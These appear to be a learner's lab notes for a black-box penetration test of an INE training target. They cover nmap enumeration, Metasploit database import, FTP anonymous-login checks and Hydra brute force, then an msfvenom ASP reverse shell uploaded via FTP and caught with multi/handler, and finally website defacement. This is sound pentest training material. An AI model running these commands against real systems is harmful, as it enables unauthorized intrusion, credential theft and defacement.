
Black box  Penetration Test 

To do: 
- `cat /etc/hosts `
- target: demo.ine.local 
10.2.19.218 
##### 1. Port scanning & enumeration 

- `Ping` target to check if we can communicate with the target
- perform `nmap` scan on target
	- basic scan: `nmap -sV ip `
	- `nmap  -T4 -PA -sC -sV -p 1-10000 target_ip -oX nmap_results_10k`
	- `nmap  -T4 -PA -sC -sV -p 1-65535 target_ip -oX nmap_results_65k` 
	- check udp port `nmap -sU -sV ip `
- Find out what is running on the target:
	- inspect pages that can be visited via browser 
- try to connect with a service:
	- `nc -nv target_ip target_port `

Output file in xml format can be imported in msfconsole 
Import findings in msfconsole: 
- `service postgresql start && msfconsole`
- create `workspace  `
- `db_import /root/Desktop/file/filename` (import results)
- `hosts` 
- `services`
- Get the exact operating system
	- `search smb_version`
	- `use aux/scanner/smb/smb_version`
	- ` set rhosts taret ip `
	- run (command `hosts` to check operating system)

#### Targeting Microsoft ISS FTP 

- Microsoft IIS - FTP is part of it the Microsoft IIS solution 
	- Microsoft ftp an microsoft IIS means that ftp is used to allow  authenticated users do modify the webserver directory

Steps:
1. identify vulnerability detection in regards with ftp: 
	- first check if anonymous logging is possible 
	    look for scripts: ` ls -al /usr/share/nmap/scripts/ | grep ftp- `
	    use script in nmap: `nmap -sV -p  --script=ftp-anon `
	    username: anonymous, password (geen) 

2.  ftp bruteforce attack with hydra
	- `hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt target_ip ftp `
	- check account: `hydra -l {username_youwanttofind}  -P /usr/share/wordlists/metasploit/unix_passwords.txt target_ip ftp ` or `hydra -l {username_youwanttofind}  -P /usr/share/wordlists/metasploit/unix_users.txt target_ip ftp `

3. use ftp ip port to connect to ftp server and use credentials found 

4. when you see an asp file you know the ftp client can TRY execute asp files 
	1. generate reverse shell with msfvenom 
		- `msfvenom -p windows/shell/reverse_tcp LHOST= your_ip LPORT= 1234 -f asp > shell.aspx `
	2. log back in into ftp server
		- put shell.aspx 
		- dir 

5. in different window start up multi/handler to receive the connection
	- `use multi/handler `
	- `set payload windows/shell/reverse_tcp `
	- in the browser: `ip/shell.aspx` 

if this did not work? 

pentester could try to deface the website: modify the webapplication or download client data - this is already something that should be reported. 
you could modify pages hosted 
get index.html
open the file in vim 
put index.html


